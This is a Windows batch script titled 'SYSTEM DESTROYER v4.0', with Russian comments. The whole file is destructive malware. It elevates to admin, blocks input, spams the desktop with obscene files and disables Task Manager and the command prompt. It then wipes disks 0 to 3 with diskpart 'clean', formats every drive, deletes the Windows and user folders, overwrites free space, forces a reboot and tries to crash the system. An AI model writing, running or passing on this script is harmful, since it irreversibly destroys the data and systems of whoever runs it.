@echo off
setlocal enabledelayedexpansion

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ========================================
echo    SYSTEM DESTROYER v4.0 - FINAL
echo ========================================
echo.

REM === БЛОКИРОВКА КЛАВИШ И МЫШИ ===
echo [0] Блокировка интерфейса...
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
powershell -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class User32{[DllImport(\"user32.dll\")]public static extern bool BlockInput(bool fBlockIt);}';[User32]::BlockInput($true)"

REM === СКАЧИВАНИЕ И УСТАНОВКА ОБОЕВ ===
echo [1] Установка обоев...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://avatars.mds.yandex.net/i?id=27fde2643b29de9539d53dcb39448767_l-10814230-images-thumbs&n=13', '%TEMP%\wallpaper.jpg')"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\wallpaper.jpg" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "2" /f >nul 2>&1
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True

REM === СПАМ TXT ФАЙЛАМИ НА РАБОЧЕМ СТОЛЕ ===
echo [2] Создание файлов...
set "desktop=%USERPROFILE%\Desktop"
for /l %%i in (1,1,500) do (
    echo im fuck your pc > "%desktop%\FUCKED_%%i.txt"
)

REM === БЛОКИРОВКА ДИСПЕТЧЕРА ЗАДАЧ И ДРУГИХ СИСТЕМНЫХ ФУНКЦИЙ ===
echo [3] Блокировка системных функций...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1

REM === БЛОКИРОВКА ПЕРЕЗАГРУЗКИ ИЗ ИНТЕРФЕЙСА ===
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f >nul 2>&1

REM === УНИЧТОЖЕНИЕ MBR И GPT ===
echo [4] Уничтожение загрузчика...
for %%d in (0 1 2 3) do (
    echo select disk %%d > %temp%\clean.dps
    echo clean >> %temp%\clean.dps
    echo exit >> %temp%\clean.dps
    diskpart /s %temp%\clean.dps >nul 2>&1
)

REM === ФОРМАТИРОВАНИЕ ДИСКОВ ===
echo [5] Форматирование всех дисков...
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo y|format %%d: /FS:NTFS /Q /X /V:DEAD >nul 2>&1
    )
)

REM === УДАЛЕНИЕ СИСТЕМНЫХ ПАПОК ===
echo [6] Уничтожение системных папок...
for %%f in ("C:\Windows" "C:\Program Files" "C:\Program Files (x86)" "C:\Users" "C:\ProgramData") do (
    if exist %%f (
        takeown /f %%f /r /d y >nul 2>&1
        icacls %%f /grant everyone:F /t /c /q >nul 2>&1
        rd /s /q %%f >nul 2>&1
    )
)

REM === СПАМ В КОНСОЛИ ===
:spam
echo im fuck your pc, windows user
echo im fuck your pc, windows user
echo im fuck your pc, windows user
echo im fuck your pc, windows user
echo im fuck your pc, windows user
echo im fuck your pc, windows user
echo im fuck your pc, windows user
echo im fuck your pc, windows user
echo im fuck your pc, windows user
echo im fuck your pc, windows user
goto spam

REM === ДОПОЛНИТЕЛЬНЫЕ ФАЙЛЫ ===
echo [7] Создание дополнительных файлов...
for /l %%i in (1,1,100) do (
    echo SYSTEM DESTROYED >> "%desktop%\DESTROYED_%%i.txt"
)

REM === БЛОКИРОВКА ПРОЦЕССОВ ===
echo [8] Блокировка процессов...
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im regedit.exe >nul 2>&1
taskkill /f /im cmd.exe /fi "PID ne %PID%" >nul 2>&1

REM === ЗАТИРАНИЕ СВОБОДНОГО ПРОСТРАНСТВА ===
echo [9] Затирание дисков...
for %%d in (C D E F) do if exist %%d:\ cipher /w:%%d:\ >nul 2>&1

REM === ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА ===
echo.
echo ========================================
echo    СИСТЕМА УНИЧТОЖЕНА
echo    Перезагрузка через 10 секунд...
echo ========================================

REM === СОЗДАНИЕ ПРОЦЕССОВ-БЛОКИРОВЩИКОВ ===
for /l %%i in (1,1,20) do (
    start /min "" cmd /c "echo DO NOT CLOSE && timeout /t 9999"
)

timeout /t 10 /nobreak >nul

shutdown /r /f /t 0
wmic os where primary=1 call reboot >nul 2>&1

REM === ЕСЛИ ПЕРЕЗАГРУЗКА НЕ СРАБОТАЛА - СИНИЙ ЭКРАН ===
rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
rundll32.exe ntdll.dll,NtRaiseHardError 0xc000021a 0 0 0 6 >nul 2>&1
